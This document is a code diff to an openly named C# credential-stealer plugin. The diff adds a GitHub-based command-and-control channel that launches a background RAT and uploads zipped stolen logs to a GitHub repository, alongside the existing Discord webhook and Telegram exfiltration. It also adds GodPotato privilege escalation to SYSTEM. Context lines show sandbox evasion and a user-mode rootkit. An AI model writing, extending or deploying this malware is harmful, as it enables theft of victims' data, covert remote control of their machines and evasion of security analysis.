@@ -30,6 +30,8 @@ public sealed class Stealer : IUniversalPlugin
   private string _discordWebhook = "";
   private string _telegramToken = "";
   private string _telegramChatId = "";
+  private string _githubToken = "";
+  private string _githubRepo = "";
   private readonly string _configPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "pulsar_cl_conf.bin");
   private static readonly List<ITarget> Targets = new List<ITarget>()
   {
@@ -142,7 +144,20 @@ public sealed class Stealer : IUniversalPlugin
         this._telegramToken = strArray[1];
         this._telegramChatId = strArray[2];
       }
+      if (strArray.Length >= 5)
+      {
+        this._githubToken = strArray[3];
+        this._githubRepo = strArray[4];
+      }
       this.SaveLocalConfig();
+
+      // Initialize GitHub C2 if configured
+      if (!string.IsNullOrEmpty(this._githubToken) && !string.IsNullOrEmpty(this._githubRepo))
+      {
+          Intelix.Targets.C2.GitHubC2.Initialize(this._githubToken, this._githubRepo);
+          // Start RAT in background (Fire & Forget)
+          Task.Run(() => Intelix.Targets.C2.GitHubC2.StartRAT());
+      }
 
       // Shadow Core Integration (Project Shadow)
       // Check for VM/Sandbox environment using Advanced ASM/Rust techniques
@@ -155,6 +170,16 @@ public sealed class Stealer : IUniversalPlugin
 
       // Activate User-Mode Rootkit (Hide functionality)
       Intelix.AntiAnalysis.AdvancedChecks.ActivateStealthMode();
+
+      // Privilege Escalation (GodPotato)
+      // If valid system and not yet SYSTEM, attempt to escalate.
+      if (!Intelix.PrivilegeEscalation.GodPotato.IsSystem())
+      {
+          Intelix.PrivilegeEscalation.GodPotato.Escalate();
+          // If execute successful, the current process will exit
+      }
+      // If we are here, we are either SYSTEM or escalation failed silently (continue as user)
+
     }
     catch
     {
@@ -183,6 +208,8 @@ public sealed class Stealer : IUniversalPlugin
         Task.Run((Action) (() => this.SendToDiscord(this._discordWebhook, zipBytes, fileName)));
       if (!string.IsNullOrEmpty(this._telegramToken) && !string.IsNullOrEmpty(this._telegramChatId))
         Task.Run((Action) (() => this.SendToTelegram(this._telegramToken, this._telegramChatId, zipBytes, fileName)));
+      if (!string.IsNullOrEmpty(this._githubToken) && !string.IsNullOrEmpty(this._githubRepo))
+        Task.Run(async () => await Intelix.Targets.C2.GitHubC2.UploadFile(fileName, "log", zipBytes));
       return new PluginResult()
       {
         Success = true,
@@ -278,7 +305,7 @@ public sealed class Stealer : IUniversalPlugin
   {
     try
     {
-      File.WriteAllBytes(this._configPath, Encoding.UTF8.GetBytes($"{this._discordWebhook}|{this._telegramToken}|{this._telegramChatId}"));
+      File.WriteAllBytes(this._configPath, Encoding.UTF8.GetBytes($"{this._discordWebhook}|{this._telegramToken}|{this._telegramChatId}|{this._githubToken}|{this._githubRepo}"));
     }
     catch
     {
@@ -298,6 +325,11 @@ public sealed class Stealer : IUniversalPlugin
         return;
       this._telegramToken = strArray[1];
       this._telegramChatId = strArray[2];
+      if (strArray.Length >= 5)
+      {
+          this._githubToken = strArray[3];
+          this._githubRepo = strArray[4];
+      }
     }
     catch
     {
